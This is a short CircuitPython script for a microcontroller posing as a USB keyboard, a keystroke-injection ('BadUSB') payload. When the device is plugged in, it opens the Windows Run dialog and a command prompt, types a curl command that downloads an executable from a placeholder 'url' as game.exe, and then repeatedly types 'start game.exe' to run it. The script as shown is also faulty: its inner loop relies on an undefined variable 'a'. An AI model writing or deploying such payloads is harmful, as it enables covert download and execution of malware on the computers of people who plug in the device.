import time
import usb_hid
from adafruit_hid.mouse import Mouse
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
import board
import digitalio


mouse = Mouse(usb_hid.devices)
time.sleep(1)
keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)

S = 1
while S < 2:
    keyboard.press(Keycode.WINDOWS, Keycode.R)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard_layout.write("cmd")
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(1)
    keyboard_layout.write("curl 'url' --output game.exe")
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    
    time.sleep(5)
    while a < 4:
        keyboard_layout.write("start game.exe")
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
    S = S+1
